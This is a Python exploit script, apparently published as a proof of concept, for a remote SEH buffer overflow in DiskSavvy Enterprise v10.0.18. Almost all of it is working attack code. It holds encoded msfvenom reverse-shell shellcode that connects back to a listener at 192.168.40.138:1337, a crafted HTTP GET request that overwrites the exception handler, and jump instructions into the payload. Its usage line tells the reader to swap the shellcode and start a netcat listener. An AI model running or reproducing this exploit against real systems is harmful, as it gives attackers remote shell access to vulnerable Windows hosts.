#!/usr/bin/python3

######################################
#   Exploit Title:      DiskSavvy Enterprise v10.0.18 - Remote BOF (SEH)
#   Date:               7 Sept 2017
#   Exploit Author:     n3ckD_
#   Vendor Homepage:    http://www.disksavvy.com/
#   Software Link:      http://www.disksavvy.com/setups/disksavvyent_setup_v10.0.18.exe
#   Version:            DiskSavvy Enterprise v10.0.18 (32-bit)
#   Tested on:          Windows 7 Enterprise SP1 (Build 7601)
#   Usage:              Swap out shellcode. Start nc listener, and send exploit
######################################

import socket, sys

host = '192.168.40.128'
port = 8084

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((host,port))
	print("Connected to %s:%s" %(host,port))
except:
	print("Unable to connect to %s:%s" %(host,port))
	sys.exit(2)

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.40.138 LPORT=1337 -e x86/alpha_mixed -f python
buf =  ""
buf += "\x89\xe7\xda\xd0\xd9\x77\xf4\x5a\x4a\x4a\x4a\x4a\x4a"
buf += "\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37"
buf += "\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += "\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x49\x78\x4e\x62"
buf += "\x63\x30\x43\x30\x67\x70\x75\x30\x6b\x39\x6b\x55\x74"
buf += "\x71\x4f\x30\x53\x54\x4e\x6b\x72\x70\x36\x50\x4c\x4b"
buf += "\x76\x32\x54\x4c\x6c\x4b\x76\x32\x46\x74\x6c\x4b\x44"
buf += "\x32\x56\x48\x46\x6f\x4f\x47\x30\x4a\x77\x56\x66\x51"
buf += "\x39\x6f\x6c\x6c\x45\x6c\x63\x51\x73\x4c\x55\x52\x64"
buf += "\x6c\x51\x30\x39\x51\x38\x4f\x66\x6d\x63\x31\x59\x57"
buf += "\x79\x72\x69\x62\x73\x62\x72\x77\x4e\x6b\x46\x32\x64"
buf += "\x50\x4c\x4b\x62\x6a\x77\x4c\x4e\x6b\x62\x6c\x46\x71"
buf += "\x31\x68\x7a\x43\x32\x68\x47\x71\x68\x51\x56\x31\x4c"
buf += "\x4b\x70\x59\x37\x50\x55\x51\x7a\x73\x6c\x4b\x63\x79"
buf += "\x36\x78\x6d\x33\x36\x5a\x43\x79\x6c\x4b\x46\x54\x6e"
buf += "\x6b\x65\x51\x5a\x76\x66\x51\x39\x6f\x4c\x6c\x6b\x71"
buf += "\x5a\x6f\x54\x4d\x33\x31\x5a\x67\x34\x78\x59\x70\x72"
buf += "\x55\x6c\x36\x47\x73\x33\x4d\x6a\x58\x77\x4b\x31\x6d"
buf += "\x61\x34\x61\x65\x4b\x54\x62\x78\x6c\x4b\x61\x48\x74"
buf += "\x64\x36\x61\x5a\x73\x35\x36\x6e\x6b\x66\x6c\x32\x6b"
buf += "\x6c\x4b\x73\x68\x35\x4c\x47\x71\x69\x43\x6e\x6b\x44"
buf += "\x44\x4e\x6b\x46\x61\x6e\x30\x6f\x79\x63\x74\x45\x74"
buf += "\x54\x64\x51\x4b\x33\x6b\x30\x61\x63\x69\x52\x7a\x66"
buf += "\x31\x79\x6f\x4d\x30\x51\x4f\x71\x4f\x70\x5a\x6c\x4b"
buf += "\x32\x32\x48\x6b\x4e\x6d\x43\x6d\x52\x48\x74\x73\x74"
buf += "\x72\x75\x50\x35\x50\x65\x38\x31\x67\x42\x53\x37\x42"
buf += "\x43\x6f\x42\x74\x30\x68\x52\x6c\x61\x67\x56\x46\x74"
buf += "\x47\x49\x6f\x38\x55\x4f\x48\x4e\x70\x46\x61\x55\x50"
buf += "\x47\x70\x34\x69\x78\x44\x31\x44\x56\x30\x62\x48\x35"
buf += "\x79\x4f\x70\x32\x4b\x37\x70\x79\x6f\x4e\x35\x76\x30"
buf += "\x36\x30\x72\x70\x56\x30\x63\x70\x30\x50\x53\x70\x42"
buf += "\x70\x72\x48\x78\x6a\x74\x4f\x6b\x6f\x79\x70\x79\x6f"
buf += "\x69\x45\x6a\x37\x70\x6a\x43\x35\x70\x68\x49\x50\x69"
buf += "\x38\x44\x68\x4d\x5a\x50\x68\x53\x32\x77\x70\x54\x45"
buf += "\x47\x49\x6c\x49\x78\x66\x71\x7a\x66\x70\x66\x36\x42"
buf += "\x77\x52\x48\x4c\x59\x4d\x75\x63\x44\x51\x71\x79\x6f"
buf += "\x59\x45\x6d\x55\x79\x50\x54\x34\x56\x6c\x69\x6f\x32"
buf += "\x6e\x57\x78\x70\x75\x6a\x4c\x51\x78\x7a\x50\x6e\x55"
buf += "\x6d\x72\x36\x36\x6b\x4f\x6a\x75\x45\x38\x65\x33\x50"
buf += "\x6d\x62\x44\x63\x30\x4e\x69\x6d\x33\x51\x47\x52\x77"
buf += "\x50\x57\x44\x71\x78\x76\x32\x4a\x66\x72\x30\x59\x73"
buf += "\x66\x38\x62\x59\x6d\x43\x56\x58\x47\x33\x74\x54\x64"
buf += "\x55\x6c\x63\x31\x53\x31\x6e\x6d\x51\x54\x67\x54\x62"
buf += "\x30\x5a\x66\x35\x50\x33\x74\x63\x64\x46\x30\x36\x36"
buf += "\x62\x76\x53\x66\x72\x66\x52\x76\x72\x6e\x33\x66\x62"
buf += "\x76\x61\x43\x30\x56\x35\x38\x73\x49\x48\x4c\x77\x4f"
buf += "\x6f\x76\x39\x6f\x49\x45\x4c\x49\x4b\x50\x52\x6e\x56"
buf += "\x36\x30\x46\x4b\x4f\x64\x70\x61\x78\x34\x48\x6e\x67"
buf += "\x55\x4d\x33\x50\x39\x6f\x58\x55\x4f\x4b\x6c\x30\x6e"
buf += "\x55\x4c\x62\x62\x76\x35\x38\x79\x36\x5a\x35\x4f\x4d"
buf += "\x4d\x4d\x39\x6f\x4b\x65\x67\x4c\x46\x66\x53\x4c\x36"
buf += "\x6a\x6b\x30\x59\x6b\x59\x70\x70\x75\x47\x75\x4f\x4b"
buf += "\x51\x57\x64\x53\x53\x42\x32\x4f\x32\x4a\x67\x70\x36"
buf += "\x33\x39\x6f\x48\x55\x41\x41"

junk = "\x90" * (2496-len(buf))

print("SEH is at position: %s" %(len(junk) + len(buf)))

SEH = "\xEF\xBC\x01\x10" 	# Address=1001BCEF Module=libspp pop; pop; ret
nSEH = "\xeb\x10\x90\x90" 	# JMP SHORT 10
nops = "\x90"* 12 		# JMP padding
jmp2 = "\xe9\x27\xf6\xff\xff" 	# JMP backwards to shellcode @ beginning of buffer

payload = buf + junk + nSEH + SEH + nops + jmp2 + "D"*(4189 - len(buf))

request = "GET %s HTTP/1.1\r\n" %payload
request += "Host: %s \r\n" %host
request += "Accept Encoding: gzip, deflate\r\n"
request += "Accept: */*\r\n"
request += "User Agent: gl; hf\r\n"
request += "Connection: close\r\n\r\n"

b = bytearray()
b.extend(map(ord, request))

print("Payload is %s bytes long" %len(payload))

s.send(b)
s.close()
